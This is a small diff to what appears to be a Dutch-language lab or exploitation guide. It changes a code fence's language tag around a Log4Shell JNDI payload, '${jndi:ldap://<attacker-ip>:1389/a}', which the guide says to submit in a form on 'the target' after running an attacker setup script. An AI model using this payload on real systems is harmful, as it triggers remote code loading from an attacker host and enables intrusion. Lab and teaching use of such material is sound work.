@@ -38,7 +38,7 @@ chmod +x setup_attacker.sh
 ```
 
 Gebruik de volgende payload in het formulier op de target:
-```text
+```bash
 ${jndi:ldap://<attacker-ip>:1389/a}
 ```
 
